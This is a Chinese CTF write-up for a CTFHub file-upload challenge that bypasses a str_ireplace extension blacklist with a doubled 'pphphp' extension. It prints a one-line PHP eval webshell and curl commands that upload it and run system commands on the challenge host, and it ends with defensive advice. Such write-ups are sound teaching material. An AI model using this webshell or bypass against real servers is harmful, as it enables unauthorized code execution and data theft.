---
title: CTFHub 文件上传-双写绕过
date: 2026-10-21
categories: CTFHub Web 文件上传
tags:  CTFHub Web 文件上传
---

# 题目: CTFHub 文件上传-双写绕过

## 题目描述
题目允许上传文件。查看页面源码，发现后端处理逻辑如下：
```php
$name = basename($_FILES['file']['name']);
$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");
$name = str_ireplace($blacklist, "", $name);
```
分析：服务器使用了 str_ireplace 函数，将黑名单里的危险后缀（如 php）替换为空字符串。但这个函数只执行一次替换，这就留下了“双写”的死穴。

## 解题思路
### 漏洞原理
str_ireplace 会寻找匹配的字符串并替换为空。如果我们传入 pphphp，它匹配到中间的 php 替换为空，剩下的 pph 和 php 拼接，刚好又变成了 php。

### 攻击链
构造文件名为 shell.pphphp。
服务器过滤 php 后，文件名变成 shell.php。
成功上传并解析。

## 解题步骤
1. 准备木马
新建 shell.jpg，内容如下：
```php
<?php @eval($_POST['cmd']); ?>
```
2. 用 cURL 双写上传
使用 curl 命令，在 filename 参数中写入 shell.pphphp：
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/ -F "file=@C:\Users\25047\Desktop\shell.jpg;filename=shell.pphphp" -F "submit=Submit"
```
返回结果：
```html
<script>alert('上传成功');</script>上传文件相对路径<br>upload/shell.php
```
可以看到，经过过滤后，文件成功保存为 shell.php。

3. 连马并获取 Flag
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('ls');"
```
确认木马执行后，全盘搜索 flag：
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('find / -name flag* 2>/dev/null');"
```
找到 /var/www/html/flag_xxx.php 后 cat 读取即可。

## 踩坑指南
1. 直接在网页上传 shell.php 被拦截
原因： 前端可能做了校验，或者后端直接拦截了 .php 后缀。
解决： 用 curl 在发包时通过 filename= 参数强行篡改文件名，并使用双写绕过。

## 知识点总结
| 知识点 | 说明 |
| :--- | :--- |
| 黑名单过滤 | 服务器禁用已知危险后缀 |
| `str_ireplace` | PHP 字符串替换函数，只执行一次替换 |
| 双写绕过 | 利用替换逻辑缺陷，构造 `pphphp` 等字符串 |

### 防御建议
1. 循环替换：使用 while 循环，直到替换后的字符串不再变化为止。
2. 白名单校验：尽量使用白名单，只允许特定的安全后缀。
3. 重命名文件：上传后直接重命名为随机字符串，不信任用户输入的文件名。
